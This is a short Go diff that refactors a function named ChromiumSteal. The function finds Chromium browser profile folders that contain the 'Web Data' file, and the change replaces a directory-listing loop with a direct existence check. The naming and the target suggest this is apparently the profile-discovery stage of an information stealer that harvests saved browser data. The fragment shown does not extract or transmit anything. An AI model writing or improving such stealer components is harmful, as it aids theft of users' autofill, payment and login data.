@@ -41,19 +41,14 @@ func ChromiumSteal() []Profile {
 				for _, folder := range folders {
 					if folder.IsDir() {
 						dir := filepath.Join(path, folder.Name())
-						files, err := os.ReadDir(dir)
-						if err != nil {
-							continue
+						if fileutil.Exists(filepath.Join(dir, "Web Data")) {
+							profilesPaths = append(profilesPaths, Profile{
+								Name:    folder.Name(),
+								Path:    dir,
+								Browser: browser,
+							})
 						}
-						for _, file := range files {
-							if file.Name() == "Web Data" {
-								profilesPaths = append(profilesPaths, Profile{
-									Name:    folder.Name(),
-									Path:    dir,
-									Browser: browser,
-								})
-							}
-						}
+
 					}
 				}
 			}
